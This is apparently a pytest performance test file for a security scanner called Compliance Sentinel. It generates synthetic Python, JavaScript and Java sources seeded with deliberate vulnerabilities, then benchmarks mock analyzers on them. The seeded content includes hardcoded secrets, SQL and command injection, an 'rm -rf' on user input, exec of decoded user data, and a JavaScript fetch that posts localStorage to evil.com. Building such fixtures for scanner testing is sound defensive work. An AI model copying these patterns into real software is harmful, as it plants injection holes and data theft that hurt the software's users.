"""Performance tests for Compliance Sentinel."""

import pytest
import time
import tempfile
import os
import threading
import concurrent.futures
from pathlib import Path
from datetime import datetime
from unittest.mock import Mock

from compliance_sentinel.core.interfaces import SecurityIssue, Severity, SecurityCategory
from compliance_sentinel.analyzers.languages.base import ProgrammingLanguage


class TestPerformanceBenchmarks:
    """Performance benchmark tests."""
    
    def setup_method(self):
        """Set up performance test fixtures."""
        self.large_code_samples = {
            "large_python_file": self._generate_large_python_file(1000),
            "medium_python_file": self._generate_large_python_file(500),
            "small_python_file": self._generate_large_python_file(100),
            "large_javascript_file": self._generate_large_javascript_file(1000),
            "large_java_file": self._generate_large_java_file(500)
        }
    
    def _generate_large_python_file(self, num_functions: int) -> str:
        """Generate a large Python file for testing."""
        lines = [
            "import os",
            "import hashlib",
            "import subprocess",
            "import base64",
            "",
            "# Configuration",
            "API_KEY = \"sk-test-key-12345\"  # Hardcoded secret",
            "DATABASE_PASSWORD = \"admin123\"  # Another secret",
            ""
        ]
        
        for i in range(num_functions):
            lines.extend([
                f"def function_{i}(param1, param2):",
                f"    \"\"\"Function {i} documentation.\"\"\"",
                f"    if param1 > {i}:",
                f"        for j in range({i % 10 + 1}):",
                f"            if j % 2 == 0:",
                f"                result = param1 + param2 + {i}",
                f"            else:",
                f"                result = param1 * param2 + {i}",
                f"        return result",
                f"    else:",
                f"        # Potential security issue",
                f"        query = f\"SELECT * FROM table WHERE id = {{param1}}\"",
                f"        return execute_query(query)",
                ""
            ])
        
        # Add some security issues
        lines.extend([
            "def vulnerable_function():",
            "    password = \"hardcoded_password_123\"",
            "    os.system(f\"rm -rf {user_input}\")",
            "    return hashlib.md5(password.encode()).hexdigest()",
            "",
            "def another_vulnerable_function():",
            "    exec(base64.b64decode(user_provided_data))",
            "    subprocess.call(command, shell=True)",
            ""
        ])
        
        return "\\n".join(lines)
    
    def _generate_large_javascript_file(self, num_functions: int) -> str:
        """Generate a large JavaScript file for testing."""
        lines = [
            "// Configuration",
            "const API_KEY = 'sk-js-key-12345';  // Hardcoded secret",
            "const DB_PASSWORD = 'admin123';  // Another secret",
            ""
        ]
        
        for i in range(num_functions):
            lines.extend([
                f"function jsFunction{i}(param1, param2) {{",
                f"    // Function {i}",
                f"    if (param1 > {i}) {{",
                f"        for (let j = 0; j < {i % 10 + 1}; j++) {{",
                f"            if (j % 2 === 0) {{",
                f"                result = param1 + param2 + {i};",
                f"            }} else {{",
                f"                result = param1 * param2 + {i};",
                f"            }}",
                f"        }}",
                f"        return result;",
                f"    }} else {{",
                f"        // XSS vulnerability",
                f"        document.getElementById('content').innerHTML = param1;",
                f"        return param1;",
                f"    }}",
                f"}}",
                ""
            ])
        
        # Add security issues
        lines.extend([
            "function vulnerableFunction() {",
            "    eval(userInput);",
            "    document.write(untrustedData);",
            "    fetch('http://evil.com/steal', { method: 'POST', body: localStorage });",
            "}",
            ""
        ])
        
        return "\\n".join(lines)
    
    def _generate_large_java_file(self, num_classes: int) -> str:
        """Generate a large Java file for testing."""
        lines = [
            "import java.sql.*;",
            "import java.security.MessageDigest;",
            "import java.util.*;",
            "",
            "public class LargeJavaFile {",
            "    // Hardcoded secrets",
            "    private static final String API_KEY = \"sk-java-key-12345\";",
            "    private static final String DB_PASSWORD = \"admin123\";",
            ""
        ]
        
        for i in range(num_classes):
            lines.extend([
                f"    public class InnerClass{i} {{",
                f"        private int value{i};",
                f"        ",
                f"        public InnerClass{i}(int value) {{",
                f"            this.value{i} = value;",
                f"        }}",
                f"        ",
                f"        public int process{i}(int input) {{",
                f"            if (input > {i}) {{",
                f"                for (int j = 0; j < {i % 10 + 1}; j++) {{",
                f"                    if (j % 2 == 0) {{",
                f"                        value{i} += input + {i};",
                f"                    }} else {{",
                f"                        value{i} *= input + {i};",
                f"                    }}",
                f"                }}",
                f"                return value{i};",
                f"            }} else {{",
                f"                // SQL injection vulnerability",
                f"                String query = \"SELECT * FROM users WHERE id = \" + input;",
                f"                return executeQuery(query);",
                f"            }}",
                f"        }}",
                f"    }}",
                ""
            ])
        
        lines.extend([
            "    public void vulnerableMethod(String userInput) {",
            "        // Command injection",
            "        Runtime.getRuntime().exec(\"cmd /c \" + userInput);",
            "    }",
            "}"
        ])
        
        return "\\n".join(lines)
    
    def test_single_file_analysis_performance(self):
        """Test performance of analyzing single files of different sizes."""
        
        class MockAnalyzer:
            def analyze_content(self, content: str, file_path: str, language: ProgrammingLanguage):
                # Simulate analysis work
                lines = content.split('\\n')
                issues = []
                
                for line_num, line in enumerate(lines, 1):
                    # Simple pattern matching (simulating real analysis)
                    if any(pattern in line.lower() for pattern in ['password', 'secret', 'key']):
                        if any(quote in line for quote in ['"', "'"]):
                            issues.append(SecurityIssue(
                                id=f"perf_test_{line_num}",
                                severity=Severity.MEDIUM,
                                category=SecurityCategory.HARDCODED_SECRETS,
                                file_path=file_path,
                                line_number=line_num,
                                description="Performance test issue",
                                rule_id="perf_rule",
                                confidence=0.7,
                                remediation_suggestions=[],
                                created_at=datetime.now()
                            ))
                
                return issues
        
        analyzer = MockAnalyzer()
        performance_results = {}
        
        for file_name, content in self.large_code_samples.items():
            start_time = time.time()
            
            issues = analyzer.analyze_content(
                content, 
                file_name, 
                ProgrammingLanguage.PYTHON
            )
            
            end_time = time.time()
            execution_time = end_time - start_time
            
            lines_count = len(content.split('\\n'))
            lines_per_second = lines_count / execution_time if execution_time > 0 else float('inf')
            
            performance_results[file_name] = {
                'execution_time': execution_time,
                'lines_count': lines_count,
                'lines_per_second': lines_per_second,
                'issues_found': len(issues)
            }
        
        # Performance assertions
        for file_name, results in performance_results.items():
            # Should process at least 1000 lines per second
            assert results['lines_per_second'] > 1000, f"{file_name}: {results['lines_per_second']} lines/sec"
            
            # Should complete within reasonable time based on file size
            if results['lines_count'] < 500:
                assert results['execution_time'] < 0.5, f"{file_name}: {results['execution_time']}s"
            elif results['lines_count'] < 1000:
                assert results['execution_time'] < 1.0, f"{file_name}: {results['execution_time']}s"
            else:
                assert results['execution_time'] < 2.0, f"{file_name}: {results['execution_time']}s"
        
        print("\\nPerformance Results:")
        for file_name, results in performance_results.items():
            print(f"{file_name}: {results['lines_count']} lines, "
                  f"{results['execution_time']:.3f}s, "
                  f"{results['lines_per_second']:.0f} lines/sec, "
                  f"{results['issues_found']} issues")
    
    def test_concurrent_file_analysis(self):
        """Test performance of concurrent file analysis."""
        
        class MockConcurrentAnalyzer:
            def analyze_file(self, file_path: str, content: str):
                # Simulate analysis work with some CPU usage
                lines = content.split('\\n')
                issues = []
                
                # Simulate more intensive analysis
                for line_num, line in enumerate(lines, 1):
                    # Multiple pattern checks
                    patterns = ['password', 'secret', 'key', 'token', 'api_key']
                    for pattern in patterns:
                        if pattern in line.lower() and any(q in line for q in ['"', "'"]):
                            issues.append(SecurityIssue(
                                id=f"concurrent_{hash(line) % 10000}",
                                severity=Severity.MEDIUM,
                                category=SecurityCategory.HARDCODED_SECRETS,
                                file_path=file_path,
                                line_number=line_num,
                                description=f"Found {pattern} pattern",
                                rule_id="concurrent_rule",
                                confidence=0.8,
                                remediation_suggestions=[],
                                created_at=datetime.now()
                            ))
                
                return issues
        
        analyzer = MockConcurrentAnalyzer()
        
        # Prepare test files
        test_files = [
            (f"test_file_{i}.py", self.large_code_samples["medium_python_file"])
            for i in range(10)
        ]
        
        # Sequential analysis
        start_time = time.time()
        sequential_results = []
        for file_path, content in test_files:
            issues = analyzer.analyze_file(file_path, content)
            sequential_results.append((file_path, issues))
        sequential_time = time.time() - start_time
        
        # Concurrent analysis
        start_time = time.time()
        concurrent_results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            future_to_file = {
                executor.submit(analyzer.analyze_file, file_path, content): file_path
                for file_path, content in test_files
            }
            
            for future in concurrent.futures.as_completed(future_to_file):
                file_path = future_to_file[future]
                try:
                    issues = future.result()
                    concurrent_results.append((file_path, issues))
                except Exception as exc:
                    pytest.fail(f"File {file_path} generated an exception: {exc}")
        
        concurrent_time = time.time() - start_time
        
        # Performance assertions
        assert len(sequential_results) == len(test_files)
        assert len(concurrent_results) == len(test_files)
        
        # Concurrent should be faster (with some tolerance for overhead)
        speedup_ratio = sequential_time / concurrent_time
        assert speedup_ratio > 1.5, f"Speedup ratio: {speedup_ratio:.2f}"
        
        # Both should produce similar results
        sequential_issue_counts = [len(issues) for _, issues in sequential_results]
        concurrent_issue_counts = [len(issues) for _, issues in concurrent_results]
        
        # Sort to compare (order might differ due to concurrency)
        sequential_issue_counts.sort()
        concurrent_issue_counts.sort()
        
        assert sequential_issue_counts == concurrent_issue_counts
        
        print(f"\\nConcurrency Performance:")
        print(f"Sequential time: {sequential_time:.3f}s")
        print(f"Concurrent time: {concurrent_time:.3f}s")
        print(f"Speedup ratio: {speedup_ratio:.2f}x")
    
    def test_memory_usage_large_files(self):
        """Test memory usage with large files."""
        import psutil
        import gc
        
        class MockMemoryEfficientAnalyzer:
            def analyze_content_streaming(self, content: str, file_path: str):
                """Analyze content in streaming fashion to minimize memory usage."""
                issues = []
                
                # Process line by line instead of loading entire content
                lines = content.split('\\n')
                
                for line_num, line in enumerate(lines, 1):
                    # Process each line individually
                    if self._check_line_for_issues(line):
                        issues.append(SecurityIssue(
                            id=f"memory_test_{line_num}",
                            severity=Severity.LOW,
                            category=SecurityCategory.HARDCODED_SECRETS,
                            file_path=file_path,
                            line_number=line_num,
                            description="Memory test issue",
                            rule_id="memory_rule",
                            confidence=0.6,
                            remediation_suggestions=[],
                            created_at=datetime.now()
                        ))
                    
                    # Periodically clean up
                    if line_num % 1000 == 0:
                        gc.collect()
                
                return issues
            
            def _check_line_for_issues(self, line: str) -> bool:
                """Check a single line for security issues."""
                patterns = ['password', 'secret', 'key']
                return any(pattern in line.lower() for pattern in patterns)
        
        analyzer = MockMemoryEfficientAnalyzer()
        
        # Get initial memory usage
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Generate very large content
        very_large_content = self._generate_large_python_file(5000)  # ~50k lines
        
        # Analyze large content
        start_time = time.time()
        issues = analyzer.analyze_content_streaming(very_large_content, "large_test.py")
        analysis_time = time.time() - start_time
        
        # Get peak memory usage
        peak_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = peak_memory - initial_memory
        
        # Clean up
        del very_large_content
        gc.collect()
        
        # Performance assertions
        lines_count = len(very_large_content.split('\\n')) if 'very_large_content' in locals() else 50000
        
        # Should complete within reasonable time
        assert analysis_time < 10.0, f"Analysis took {analysis_time:.2f}s"
        
        # Memory usage should be reasonable (less than 100MB increase)
        assert memory_increase < 100, f"Memory increased by {memory_increase:.1f}MB"
        
        # Should process at reasonable speed
        lines_per_second = lines_count / analysis_time
        assert lines_per_second > 5000, f"Only {lines_per_second:.0f} lines/sec"
        
        print(f"\\nMemory Performance:")
        print(f"Lines processed: {lines_count}")
        print(f"Analysis time: {analysis_time:.3f}s")
        print(f"Lines per second: {lines_per_second:.0f}")
        print(f"Memory increase: {memory_increase:.1f}MB")
        print(f"Issues found: {len(issues)}")
    
    def test_batch_processing_performance(self):
        """Test performance of batch processing multiple files."""
        
        class MockBatchAnalyzer:
            def __init__(self):
                self.processed_files = 0
                self.total_issues = 0
            
            def analyze_batch(self, files_data):
                """Analyze multiple files in batch."""
                all_issues = []
                
                for file_path, content in files_data:
                    issues = self._analyze_single_file(file_path, content)
                    all_issues.extend(issues)
                    self.processed_files += 1
                    self.total_issues += len(issues)
                
                return all_issues
            
            def _analyze_single_file(self, file_path: str, content: str):
                """Analyze a single file."""
                issues = []
                lines = content.split('\\n')
                
                for line_num, line in enumerate(lines, 1):
                    if 'password' in line.lower() and '"' in line:
                        issues.append(SecurityIssue(
                            id=f"batch_{self.processed_files}_{line_num}",
                            severity=Severity.MEDIUM,
                            category=SecurityCategory.HARDCODED_SECRETS,
                            file_path=file_path,
                            line_number=line_num,
                            description="Batch test issue",
                            rule_id="batch_rule",
                            confidence=0.7,
                            remediation_suggestions=[],
                            created_at=datetime.now()
                        ))
                
                return issues
        
        analyzer = MockBatchAnalyzer()
        
        # Create batch of files
        batch_sizes = [10, 50, 100]
        performance_data = {}
        
        for batch_size in batch_sizes:
            files_data = [
                (f"batch_file_{i}.py", self.large_code_samples["small_python_file"])
                for i in range(batch_size)
            ]
            
            start_time = time.time()
            issues = analyzer.analyze_batch(files_data)
            batch_time = time.time() - start_time
            
            performance_data[batch_size] = {
                'time': batch_time,
                'files': batch_size,
                'issues': len(issues),
                'files_per_second': batch_size / batch_time,
                'time_per_file': batch_time / batch_size
            }
            
            # Reset analyzer state
            analyzer.processed_files = 0
            analyzer.total_issues = 0
        
        # Performance assertions
        for batch_size, data in performance_data.items():
            # Should process at least 10 files per second
            assert data['files_per_second'] > 10, f"Batch {batch_size}: {data['files_per_second']:.1f} files/sec"
            
            # Time per file should be reasonable
            assert data['time_per_file'] < 0.1, f"Batch {batch_size}: {data['time_per_file']:.3f}s per file"
        
        # Larger batches should have better throughput (economies of scale)
        small_batch_fps = performance_data[10]['files_per_second']
        large_batch_fps = performance_data[100]['files_per_second']
        
        # Allow some tolerance, but larger batches should generally be more efficient
        efficiency_ratio = large_batch_fps / small_batch_fps
        assert efficiency_ratio > 0.8, f"Efficiency ratio: {efficiency_ratio:.2f}"
        
        print("\\nBatch Processing Performance:")
        for batch_size, data in performance_data.items():
            print(f"Batch size {batch_size}: {data['files_per_second']:.1f} files/sec, "
                  f"{data['time_per_file']:.3f}s per file, {data['issues']} issues")
    
    def test_scalability_stress_test(self):
        """Stress test to verify scalability under load."""
        
        class MockStressTestAnalyzer:
            def __init__(self):
                self.analysis_count = 0
                self.lock = threading.Lock()
            
            def analyze_under_load(self, content: str, file_path: str):
                """Simulate analysis under stress conditions."""
                with self.lock:
                    self.analysis_count += 1
                
                # Simulate variable processing time
                import random
                processing_time = random.uniform(0.01, 0.05)  # 10-50ms
                time.sleep(processing_time)
                
                # Simple issue detection
                issues = []
                if 'password' in content.lower():
                    issues.append(SecurityIssue(
                        id=f"stress_{self.analysis_count}",
                        severity=Severity.MEDIUM,
                        category=SecurityCategory.HARDCODED_SECRETS,
                        file_path=file_path,
                        line_number=1,
                        description="Stress test issue",
                        rule_id="stress_rule",
                        confidence=0.8,
                        remediation_suggestions=[],
                        created_at=datetime.now()
                    ))
                
                return issues
        
        analyzer = MockStressTestAnalyzer()
        
        # Stress test parameters
        num_threads = 8
        files_per_thread = 25
        total_files = num_threads * files_per_thread
        
        # Prepare test data
        test_content = self.large_code_samples["small_python_file"]
        
        def worker_thread(thread_id: int):
            """Worker thread for stress testing."""
            thread_results = []
            
            for i in range(files_per_thread):
                file_path = f"stress_test_{thread_id}_{i}.py"
                try:
                    issues = analyzer.analyze_under_load(test_content, file_path)
                    thread_results.append((file_path, len(issues)))
                except Exception as e:
                    thread_results.append((file_path, f"ERROR: {e}"))
            
            return thread_results
        
        # Run stress test
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [
                executor.submit(worker_thread, thread_id)
                for thread_id in range(num_threads)
            ]
            
            all_results = []
            for future in concurrent.futures.as_completed(futures):
                try:
                    thread_results = future.result()
                    all_results.extend(thread_results)
                except Exception as exc:
                    pytest.fail(f"Thread generated an exception: {exc}")
        
        total_time = time.time() - start_time
        
        # Analyze results
        successful_analyses = [r for r in all_results if isinstance(r[1], int)]
        failed_analyses = [r for r in all_results if isinstance(r[1], str)]
        
        throughput = len(successful_analyses) / total_time
        
        # Performance assertions
        assert len(all_results) == total_files, f"Expected {total_files}, got {len(all_results)}"
        
        # Should have high success rate (>95%)
        success_rate = len(successful_analyses) / total_files
        assert success_rate > 0.95, f"Success rate: {success_rate:.2%}"
        
        # Should maintain reasonable throughput under load
        assert throughput > 50, f"Throughput: {throughput:.1f} files/sec"
        
        # Should complete within reasonable time
        assert total_time < 30, f"Stress test took {total_time:.1f}s"
        
        print(f"\\nStress Test Results:")
        print(f"Total files: {total_files}")
        print(f"Successful: {len(successful_analyses)}")
        print(f"Failed: {len(failed_analyses)}")
        print(f"Success rate: {success_rate:.2%}")
        print(f"Total time: {total_time:.2f}s")
        print(f"Throughput: {throughput:.1f} files/sec")
        
        if failed_analyses:
            print("Failed analyses:")
            for file_path, error in failed_analyses[:5]:  # Show first 5 errors
                print(f"  {file_path}: {error}")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])